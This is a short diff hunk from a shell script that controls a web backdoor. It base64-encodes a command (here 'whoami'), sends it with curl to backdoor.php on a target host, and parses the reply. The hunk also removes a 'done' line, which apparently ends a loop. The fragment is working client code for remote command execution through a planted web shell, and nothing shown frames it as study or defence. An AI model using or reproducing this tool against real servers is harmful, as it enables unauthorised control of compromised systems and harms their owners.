@@ -41,5 +41,4 @@ cmd='whoami'
     echo '[+] Running '$cmd
 curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder 
  
-done
 echo '[+] Exiting'
